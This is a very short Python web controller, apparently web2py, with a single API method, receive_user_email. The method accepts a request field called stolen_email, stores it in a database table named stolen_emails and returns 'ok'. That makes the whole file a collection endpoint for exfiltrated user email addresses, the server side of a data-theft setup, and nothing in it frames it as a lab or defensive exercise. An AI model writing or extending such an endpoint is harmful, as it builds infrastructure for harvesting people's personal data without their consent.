# Here go your api methods.

def receive_user_email():
    db.stolen_emails.insert(
        stolen_email = request.vars.stolen_email
    )
    return "ok"
